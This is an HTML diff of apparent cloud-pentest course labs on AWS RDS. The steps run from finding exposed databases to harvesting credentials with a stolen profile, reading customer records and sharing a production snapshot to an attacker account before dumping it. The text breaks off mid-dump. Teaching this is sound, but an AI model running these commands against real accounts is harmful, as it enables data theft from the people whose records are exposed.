@@ -1,0 +1,784 @@
+<div class="labs-container" id="m04-labs">
+
+  <!-- ============================================================ -->
+  <!-- LAB 1: Discovering Public RDS Instances                      -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M04-L01-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Find publicly accessible RDS database instances and map their endpoints, engines, and security group configurations.
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">List all RDS instances in the account with their key attributes &mdash; engine type, endpoint, port, and public accessibility flag.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws rds describe-db-instances --profile stolen \
+  --query 'DBInstances[*].[DBInstanceIdentifier,Engine,Endpoint.Address,Endpoint.Port,PubliclyAccessible]' \
+  --output table</div>
+              <div class="terminal-output">------------------------------------------------------------------------------------
+|                           DescribeDBInstances                                    |
++------------------+----------+---------------------------------------------+------+------+
+|  prod-db         |  mysql   |  prod-db.cluster-abc123.us-east-1.rds...    | 3306 | True |
+|  staging-db      |  mysql   |  staging-db.cde456.us-east-1.rds...         | 3306 | True |
+|  analytics-pg    |  postgres|  analytics-pg.fgh789.us-east-1.rds...       | 5432 | False|
+|  internal-db     |  mysql   |  internal-db.ijk012.us-east-1.rds...        | 3306 | False|
+|  legacy-mssql    |  sqlsrvr |  legacy-mssql.lmn345.us-east-1.rds...       | 1433 | True |
++------------------+----------+---------------------------------------------+------+------+</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Filter for only publicly accessible instances &mdash; these are reachable from the internet.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws rds describe-db-instances --profile stolen \
+  --query 'DBInstances[?PubliclyAccessible==`true`].[DBInstanceIdentifier,Endpoint.Address,Endpoint.Port,Engine]' \
+  --output table</div>
+              <div class="terminal-output">------------------------------------------------------------------------------------
+|  prod-db      |  prod-db.cluster-abc123.us-east-1.rds.amazonaws.com    | 3306 | mysql   |
+|  staging-db   |  staging-db.cde456.us-east-1.rds.amazonaws.com         | 3306 | mysql   |
+|  legacy-mssql |  legacy-mssql.lmn345.us-east-1.rds.amazonaws.com       | 1433 | sqlsrvr |
+------------------------------------------------------------------------------------</div>
+              <div class="terminal-cmd"># 3 out of 5 instances are publicly accessible — high risk</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Check security groups to see if the database ports are actually open to the internet (0.0.0.0/0).</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># First, get the security group IDs for the public instances</div>
+              <div class="terminal-cmd">$ aws rds describe-db-instances --profile stolen \
+  --db-instance-identifier prod-db \
+  --query 'DBInstances[0].VpcSecurityGroups[*].VpcSecurityGroupId' --output text</div>
+              <div class="terminal-output">sg-0a1b2c3d4e5f67890</div>
+              <div class="terminal-cmd">$ aws ec2 describe-security-groups \
+  --group-ids sg-0a1b2c3d4e5f67890 \
+  --profile stolen \
+  --query 'SecurityGroups[*].IpPermissions[?FromPort==`3306`]'</div>
+              <div class="terminal-output">[
+    [
+        {
+            "FromPort": 3306,
+            "ToPort": 3306,
+            "IpProtocol": "tcp",
+            "IpRanges": [
+                {
+                    "CidrIp": "0.0.0.0/0",
+                    "Description": "MySQL access"
+                }
+            ],
+            "Ipv6Ranges": [
+                {
+                    "CidrIpv6": "::/0",
+                    "Description": "MySQL access IPv6"
+                }
+            ]
+        }
+    ]
+]</div>
+              <div class="terminal-cmd"># 0.0.0.0/0 on port 3306 — fully open to the internet</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Port scan the public endpoints to confirm network reachability and identify running services.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ nmap -sV -p 3306,5432,1433,1521 \
+  prod-db.cluster-abc123.us-east-1.rds.amazonaws.com</div>
+              <div class="terminal-output">Starting Nmap 7.94 ( https://nmap.org )
+Nmap scan report for prod-db.cluster-abc123.us-east-1.rds.amazonaws.com (52.20.123.45)
+Host is up (0.015s latency).
+
+PORT     STATE    SERVICE       VERSION
+1433/tcp closed   ms-sql-s
+1521/tcp closed   oracle
+3306/tcp open     mysql         MySQL 8.0.35
+5432/tcp closed   postgresql
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds</div>
+              <div class="terminal-cmd">$ nmap -sV -p 1433 legacy-mssql.lmn345.us-east-1.rds.amazonaws.com</div>
+              <div class="terminal-output">PORT     STATE  SERVICE       VERSION
+1433/tcp open   ms-sql-s      Microsoft SQL Server 2019</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Document all discovered endpoints and their exposure level for use in subsequent labs.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Target Database Inventory</div>
+              <div class="terminal-output">
++------------------+----------+------+--------+----------+-----------+
+| Instance         | Engine   | Port | Public | SG Open  | Reachable |
++------------------+----------+------+--------+----------+-----------+
+| prod-db          | MySQL    | 3306 |  YES   | 0.0.0.0/0|    YES    |
+| staging-db       | MySQL    | 3306 |  YES   | 0.0.0.0/0|    YES    |
+| analytics-pg     | Postgres | 5432 |   NO   | VPC only |    NO     |
+| internal-db      | MySQL    | 3306 |   NO   | VPC only |    NO     |
+| legacy-mssql     | MSSQL    | 1433 |  YES   | 0.0.0.0/0|    YES    |
++------------------+----------+------+--------+----------+-----------+
+
+Priority Targets:
+  1. prod-db     — Production MySQL, publicly accessible
+  2. legacy-mssql — Legacy MSSQL, likely unpatched
+  3. staging-db  — Staging often has weaker credentials</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">describe-db-instances</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Filter Public</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Check SG Rules</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Port Scan</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Targets Ready</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-circle-info"></i>
+      <code>PubliclyAccessible=True</code> alone does not mean the database is reachable. The security group must also allow inbound traffic from the internet. Always verify both the RDS flag <em>and</em> the security group rules. Some instances are marked public but restricted by security group to specific IP ranges.
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 2: Extracting RDS Creds from EC2 & SSM                  -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M04-L02-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Find database credentials stored insecurely in EC2 instance user-data, SSM Parameter Store, Secrets Manager, and CloudFormation outputs.
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Check EC2 instance <strong>user-data</strong> &mdash; bootstrap scripts often contain hardcoded database credentials in plaintext.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># List EC2 instances to find targets</div>
+              <div class="terminal-cmd">$ aws ec2 describe-instances --profile stolen \
+  --query 'Reservations[*].Instances[*].[InstanceId,Tags[?Key==`Name`].Value|[0],State.Name]' \
+  --output table</div>
+              <div class="terminal-output">---------------------------------------------
+|  i-0abc123def456   |  web-server-01  |  running  |
+|  i-0def456ghi789   |  app-server-01  |  running  |
+|  i-0ghi789jkl012   |  worker-01      |  running  |
+---------------------------------------------</div>
+              <div class="terminal-cmd"># Retrieve user-data for each instance</div>
+              <div class="terminal-cmd">$ aws ec2 describe-instance-attribute \
+  --instance-id i-0abc123def456 \
+  --attribute userData \
+  --profile stolen \
+  --query 'UserData.Value' --output text | base64 -d</div>
+              <div class="terminal-output">#!/bin/bash
+# Bootstrap script for web-server-01
+yum update -y
+yum install -y mysql httpd php
+
+# Database configuration
+export DB_HOST="prod-db.cluster-abc123.us-east-1.rds.amazonaws.com"
+export DB_PORT="3306"
+export DB_USER="webapp"
+export DB_PASSWORD="MyDBPass123!"
+export DB_NAME="customers"
+
+# Start services
+systemctl start httpd
+echo "DB_HOST=$DB_HOST" >> /etc/environment</div>
+              <div class="terminal-cmd"># Found credentials! DB_USER=webapp, DB_PASSWORD=MyDBPass123!</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Search SSM Parameter Store for database-related parameters using keyword filtering.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws ssm get-parameters-by-path \
+  --path "/" --recursive --with-decryption \
+  --profile stolen | \
+  jq '.Parameters[] | select(.Name | test("rds|database|mysql|postgres|db"))'</div>
+              <div class="terminal-output">{
+  "Name": "/prod/db/host",
+  "Type": "String",
+  "Value": "prod-db.cluster-abc123.us-east-1.rds.amazonaws.com"
+}
+{
+  "Name": "/prod/db/password",
+  "Type": "SecureString",
+  "Value": "Pr0d_MySQL_P@ss!2024"
+}
+{
+  "Name": "/prod/db/username",
+  "Type": "String",
+  "Value": "admin"
+}
+{
+  "Name": "/staging/db/password",
+  "Type": "SecureString",
+  "Value": "Staging_DB_p@ss"
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Check Secrets Manager for RDS-specific secrets &mdash; AWS natively integrates RDS credential rotation with Secrets Manager.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws secretsmanager list-secrets --profile stolen \
+  --query 'SecretList[?contains(Name,`rds`) || contains(Name,`database`) || contains(Name,`db`)].[Name,Description]' \
+  --output table</div>
+              <div class="terminal-output">--------------------------------------------------------------
+|  prod/db/credentials      |  Production DB credentials     |
+|  prod/db/readonly         |  Read-only DB user             |
+|  rds!cluster-abc123-admin |  RDS managed master secret     |
+--------------------------------------------------------------</div>
+              <div class="terminal-cmd">$ aws secretsmanager get-secret-value \
+  --secret-id "rds!cluster-abc123-admin" \
+  --profile stolen \
+  --query 'SecretString' --output text | jq .</div>
+              <div class="terminal-output">{
+  "username": "admin",
+  "password": "auto-rotated-xK9#mP2$vL5nQ8",
+  "engine": "mysql",
+  "host": "prod-db.cluster-abc123.us-east-1.rds.amazonaws.com",
+  "port": 3306,
+  "dbClusterIdentifier": "prod-db"
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Check CloudFormation stack outputs and parameters &mdash; database endpoints and sometimes passwords leak through stack outputs.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws cloudformation list-stacks --profile stolen \
+  --query 'StackSummaries[?StackStatus==`CREATE_COMPLETE`].StackName' --output text</div>
+              <div class="terminal-output">prod-infrastructure    staging-infrastructure    monitoring-stack</div>
+              <div class="terminal-cmd">$ aws cloudformation describe-stacks --profile stolen \
+  --stack-name prod-infrastructure \
+  --query 'Stacks[0].Outputs[?contains(OutputKey,`DB`) || contains(OutputKey,`RDS`) || contains(OutputKey,`Database`)]'</div>
+              <div class="terminal-output">[
+    {
+        "OutputKey": "DBEndpoint",
+        "OutputValue": "prod-db.cluster-abc123.us-east-1.rds.amazonaws.com",
+        "Description": "Production database endpoint"
+    },
+    {
+        "OutputKey": "DBPort",
+        "OutputValue": "3306"
+    },
+    {
+        "OutputKey": "DBMasterUsername",
+        "OutputValue": "admin"
+    }
+]</div>
+              <div class="terminal-cmd"># Check the template for hardcoded defaults</div>
+              <div class="terminal-cmd">$ aws cloudformation get-template --stack-name prod-infrastructure --profile stolen | \
+  jq -r '.TemplateBody' | grep -i -A2 'password\|secret'</div>
+              <div class="terminal-output">      MasterUserPassword:
+        Default: "InitialP@ss2023!"
+        NoEcho: true</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Compile all discovered credentials from every source into a single reference document.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Compiled RDS Credentials</div>
+              <div class="terminal-output">
++-------------------------+----------+---------+------------------------+
+| Source                  | Username | Password                | Target |
++-------------------------+----------+-------------------------+--------+
+| EC2 user-data (i-0abc)  | webapp   | MyDBPass123!            | prod-db|
+| SSM /prod/db/*          | admin    | Pr0d_MySQL_P@ss!2024    | prod-db|
+| SSM /staging/db/*       | admin    | Staging_DB_p@ss         | stg-db |
+| SecretsManager rds!*    | admin    | auto-rotated-xK9#mP2$..| prod-db|
+| CloudFormation default  | admin    | InitialP@ss2023!        | prod-db|
++-------------------------+----------+-------------------------+--------+
+
+Unique credentials found: 5
+Unique targets: 2 (prod-db, staging-db)
+
+Note: Multiple valid credentials for prod-db — test each for
+different privilege levels (admin vs webapp vs readonly).</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">EC2 User-Data</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">SSM Params</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Secrets Manager</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">CloudFormation</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Credential Harvest</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i>
+      EC2 user-data is one of the most commonly overlooked credential exposure vectors. It is visible to anyone with <code>ec2:DescribeInstanceAttribute</code> and is stored in plaintext by AWS. Unlike Secrets Manager or SSM, user-data has no encryption, no rotation, and no access logging.
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 3: RDS IAM Authentication                                -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M04-L03-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Connect to an RDS database using IAM-based authentication with stolen AWS credentials instead of traditional database passwords.
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Generate a temporary authentication token using the stolen IAM credentials. The token acts as a password and is valid for 15 minutes.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws rds generate-db-auth-token \
+  --hostname prod-db.cluster-abc123.us-east-1.rds.amazonaws.com \
+  --port 3306 \
+  --username iam_user \
+  --profile stolen</div>
+              <div class="terminal-output">prod-db.cluster-abc123.us-east-1.rds.amazonaws.com:3306/?Action=connect&DBUser=iam_user&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIOSFODNN7EXAMPLE%2F20240316%2Fus-east-1%2Frds-db%2Faws4_request&X-Amz-Date=20240316T143000Z&X-Amz-Expires=900&X-Amz-SignedHeaders=host&X-Amz-Signature=a1b2c3d4e5f6...</div>
+              <div class="terminal-cmd"># Store the token for use as a password</div>
+              <div class="terminal-cmd">$ TOKEN=$(aws rds generate-db-auth-token \
+  --hostname prod-db.cluster-abc123.us-east-1.rds.amazonaws.com \
+  --port 3306 \
+  --username iam_user \
+  --profile stolen)</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Download the AWS RDS Certificate Authority bundle required for SSL connections to RDS.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ wget -q https://truststore.pki.rds.amazonaws.com/global/global-bundle.pem</div>
+              <div class="terminal-cmd">$ ls -lh global-bundle.pem</div>
+              <div class="terminal-output">-rw-r--r--  1 user  staff  135K Mar 16 14:30 global-bundle.pem</div>
+              <div class="terminal-cmd"># Verify the bundle contains RDS CA certificates</div>
+              <div class="terminal-cmd">$ grep -c "BEGIN CERTIFICATE" global-bundle.pem</div>
+              <div class="terminal-output">113</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Connect to MySQL using IAM authentication. The auth token is used as the password, and SSL is required.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ mysql -h prod-db.cluster-abc123.us-east-1.rds.amazonaws.com \
+  -P 3306 \
+  -u iam_user \
+  --password="$TOKEN" \
+  --ssl-ca=global-bundle.pem \
+  --enable-cleartext-plugin</div>
+              <div class="terminal-output">Welcome to the MySQL monitor. Commands end with ; or \g.
+Your MySQL connection id is 4521
+Server version: 8.0.35 Source distribution
+
+Copyright (c) 2000, 2024, Oracle and/or its affiliates.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Enumerate databases and tables to understand the data landscape.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">mysql> SHOW DATABASES;</div>
+              <div class="terminal-output">+--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| customers          |
+| orders             |
++--------------------+
+3 rows in set (0.02 sec)</div>
+              <div class="terminal-cmd">mysql> USE customers;</div>
+              <div class="terminal-output">Database changed</div>
+              <div class="terminal-cmd">mysql> SHOW TABLES;</div>
+              <div class="terminal-output">+---------------------+
+| Tables_in_customers |
++---------------------+
+| users               |
+| payment_methods     |
+| addresses           |
+| sessions            |
+| audit_log           |
++---------------------+
+5 rows in set (0.01 sec)</div>
+              <div class="terminal-cmd">mysql> DESCRIBE users;</div>
+              <div class="terminal-output">+--------------+--------------+------+-----+---------+-------+
+| Field        | Type         | Null | Key | Default | Extra |
++--------------+--------------+------+-----+---------+-------+
+| id           | int          | NO   | PRI | NULL    | auto  |
+| email        | varchar(255) | NO   | UNI | NULL    |       |
+| name         | varchar(128) | NO   |     | NULL    |       |
+| password_hash| varchar(255) | NO   |     | NULL    |       |
+| ssn_encrypted| varbinary(512)| YES |     | NULL    |       |
+| phone        | varchar(20)  | YES  |     | NULL    |       |
+| created_at   | datetime     | NO   |     | NOW()   |       |
++--------------+--------------+------+-----+---------+-------+</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Extract a sample of data to demonstrate access. In an assessment, document the data types accessible without bulk exfiltration.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">mysql> SELECT id, email, name, phone, created_at FROM users LIMIT 5;</div>
+              <div class="terminal-output">+----+---------------------------+------------------+---------------+---------------------+
+| id | email                     | name             | phone         | created_at          |
++----+---------------------------+------------------+---------------+---------------------+
+|  1 | john.doe@example.com      | John Doe         | +1-555-0101   | 2023-01-15 10:30:00 |
+|  2 | jane.smith@example.com    | Jane Smith       | +1-555-0102   | 2023-01-16 11:45:00 |
+|  3 | bob.wilson@example.com    | Bob Wilson        | +1-555-0103   | 2023-02-20 09:15:00 |
+|  4 | alice.brown@example.com   | Alice Brown       | +1-555-0104   | 2023-03-10 14:22:00 |
+|  5 | charlie.davis@example.com | Charlie Davis     | +1-555-0105   | 2023-03-28 16:50:00 |
++----+---------------------------+------------------+---------------+---------------------+
+5 rows in set (0.01 sec)</div>
+              <div class="terminal-cmd">mysql> SELECT COUNT(*) AS total_users FROM users;</div>
+              <div class="terminal-output">+-------------+
+| total_users |
++-------------+
+|       45210 |
++-------------+</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">generate-db-auth-token</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">SSL + Token</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">MySQL Connect</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Enumerate</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Exfiltrate</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-circle-info"></i>
+      IAM database authentication tokens expire after 15 minutes but the <em>connection</em> stays alive until explicitly closed. RDS IAM auth requires the DB user to be created with <code>CREATE USER iam_user IDENTIFIED WITH AWSAuthenticationPlugin AS 'RDS';</code> and the IAM policy to include <code>rds-db:connect</code>. The <code>--enable-cleartext-plugin</code> flag is required because the auth token is sent as a cleartext password over SSL.
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 4: RDS Snapshot Export & Extraction                      -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M04-L04-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Exfiltrate an entire production database by sharing an RDS snapshot to an attacker-controlled AWS account, restoring it, and dumping all data.
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">List all RDS snapshots in the account. Automated daily snapshots are prime targets &mdash; they contain full database copies.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws rds describe-db-snapshots --profile stolen \
+  --query 'DBSnapshots[*].[DBSnapshotIdentifier,DBInstanceIdentifier,SnapshotCreateTime,Status,Engine]' \
+  --output table</div>
+              <div class="terminal-output">---------------------------------------------------------------------------------
+|                          DescribeDBSnapshots                                  |
++---------------------------+-----------+-------------------------+-----------+-------+
+|  prod-daily-2024-03-16    |  prod-db  |  2024-03-16T03:00:00Z   | available | mysql |
+|  prod-daily-2024-03-15    |  prod-db  |  2024-03-15T03:00:00Z   | available | mysql |
+|  prod-daily-2024-03-14    |  prod-db  |  2024-03-14T03:00:00Z   | available | mysql |
+|  staging-snap-manual      |  stg-db   |  2024-03-10T12:00:00Z   | available | mysql |
+|  pre-migration-backup     |  prod-db  |  2024-02-28T18:30:00Z   | available | mysql |
++---------------------------+-----------+-------------------------+-----------+-------+</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Share the most recent production snapshot with an attacker-controlled AWS account by modifying the snapshot's attribute.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws rds modify-db-snapshot-attribute \
+  --db-snapshot-identifier prod-daily-2024-03-16 \
+  --attribute-name restore \
+  --values-to-add 999888777666 \
+  --profile stolen</div>
+              <div class="terminal-output">{
+    "DBSnapshotAttributesResult": {
+        "DBSnapshotIdentifier": "prod-daily-2024-03-16",
+        "DBSnapshotAttributes": [
+            {
+                "AttributeName": "restore",
+                "AttributeValues": [
+                    "999888777666"
+                ]
+            }
+        ]
+    }
+}</div>
+              <div class="terminal-cmd"># Verify the share</div>
+              <div class="terminal-cmd">$ aws rds describe-db-snapshot-attributes \
+  --db-snapshot-identifier prod-daily-2024-03-16 --profile stolen</div>
+              <div class="terminal-output"># Confirms account 999888777666 now has restore access</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Switch to the attacker account and restore a new RDS instance from the shared snapshot. Make it publicly accessible for easy extraction.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># In attacker account (999888777666)</div>
+              <div class="terminal-cmd">$ aws rds restore-db-instance-from-db-snapshot \
+  --db-instance-identifier loot-db \
+  --db-snapshot-identifier arn:aws:rds:us-east-1:123456789012:snapshot:prod-daily-2024-03-16 \
+  --db-instance-class db.t3.micro \
+  --publicly-accessible \
+  --profile attacker</div>
+              <div class="terminal-output">{
+    "DBInstance": {
+        "DBInstanceIdentifier": "loot-db",
+        "DBInstanceStatus": "creating",
+        "Engine": "mysql",
+        "DBInstanceClass": "db.t3.micro",
+        "PubliclyAccessible": true
+    }
+}</div>
+              <div class="terminal-cmd"># Wait for the instance to become available (~10 minutes)</div>
+              <div class="terminal-cmd">$ aws rds wait db-instance-available --db-instance-identifier loot-db --profile attacker</div>
+              <div class="terminal-cmd">$ aws rds describe-db-instances --db-instance-identifier loot-db \
+  --profile attacker \
+  --query 'DBInstances[0].Endpoint.Address' --output text</div>
+              <div class="terminal-output">loot-db.xyz789.us-east-1.rds.amazonaws.com</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Reset the master password on the restored instance. Since you own this RDS instance, you have full control.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws rds modify-db-instance \
+  --db-instance-identifier loot-db \
+  --master-user-password 'NewPass123!Attacker' \
+  --apply-immediately \
+  --profile attacker</div>
+              <div class="terminal-output">{
+    "DBInstance": {
+        "DBInstanceIdentifier": "loot-db",
+        "DBInstanceStatus": "modifying",
+        "PendingModifiedValues": {
+            "MasterUserPassword": "****"
+        }
+    }
+}</div>
+              <div class="terminal-cmd"># Wait for the modification to apply</div>
+              <div class="terminal-cmd">$ aws rds wait db-instance-available --db-instance-identifier loot-db --profile attacker</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Connect to the restored instance and dump the entire database. You now have a full copy of the production data.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ mysqldump -h loot-db.xyz789.us-east-1.rds.amazonaws.com \
+  -u admin \
+  -p'NewPass123!Attacker' \
+  --all-databases > full_dump.sql</div>
+              <div class="terminal-output">-- MySQL dump 10.13  Distrib 8.0.35
+-- Host: loot-db.xyz789.us-east-1.rds.amazonaws.com
+-- Server version: 8.0.35
+-- Dumping databases...
+-- Dumping database `customers` (45,210 rows)
+-- Dumping database `orders` (128,456 rows)
+-- Dumping database `analytics` (890,123 rows)
+-- Dump completed on 2024-03-16 15:30:00</div>
